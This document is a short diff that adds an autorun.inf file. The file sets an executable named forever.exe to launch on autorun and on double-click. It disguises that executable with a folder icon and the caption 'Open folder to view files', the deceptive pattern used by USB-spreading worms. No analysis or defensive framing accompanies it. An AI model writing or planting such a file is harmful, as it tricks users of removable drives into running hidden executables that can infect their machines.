@@ -1,0 +1,7 @@
+[autorun]
+open=forever.exe
+icon=%windir%\system32\SHELL32.dll,7
+action=Open folder to view files
+shell\open=Open
+shell\open\command=forever.exe
+shell\open\default=1
